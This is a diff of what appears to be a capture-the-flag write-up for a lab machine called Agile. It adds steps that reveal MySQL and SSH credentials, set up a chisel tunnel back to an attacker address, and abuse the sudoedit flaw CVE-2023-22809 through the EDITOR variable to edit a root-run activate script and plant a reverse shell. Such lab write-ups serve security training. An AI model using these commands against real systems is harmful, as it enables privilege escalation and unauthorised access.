@@ -39,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Inside registred account
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### **Cookies**
 
@@ -438,7 +438,7 @@ corum@agile:~/.tmp$ ./chisel client 10.10.16.21:12312 R:5555:127.0.0.1:5555
 
 </code></pre>
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 And found SSH creds for edwards:
 
@@ -452,15 +452,48 @@ agile edwards d07867c6267dcb5df0af
 
 <figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
-
-
-```
-/var/tmp/config_testXXcVIg3Y.json                                                  
+<pre class="language-json"><code class="lang-json">/var/tmp/config_test.json                                                  
 
 {
-    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
-}
+<strong>    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
+</strong>}
+
+-----
+
+MYSQL_LOGIN : superpasstester
+MYSQL_PASS  : VUO8A2c2#3FnLq3*a9DX1U
+</code></pre>
+
+```
+sudoedit /app/app-testing/tests/functional/creds.txt
+
 ```
 
 
+
+**We have sudo version 1.9.9 which is vulnerable to CVE-2023-22809.**
+
+{% embed url="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc" %}
+
+{% embed url="https://www.rapid7.com/db/vulnerabilities/suse-cve-2023-22809/" %}
+
+**Exploit:**&#x20;
+
+```
+export EDITOR="vim -p */any file, that can lead to PE/*"
+sudoedit *file*
+```
+
+In our case it's gonna be look like:&#x20;
+
+```
+export EDITOR="vim -p /app/venv/bin/activate"
+export EDITOR="vim -- /app/venv/bin/activate"
+```
+
+
+
+Add revshell to `activate` and get root.
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
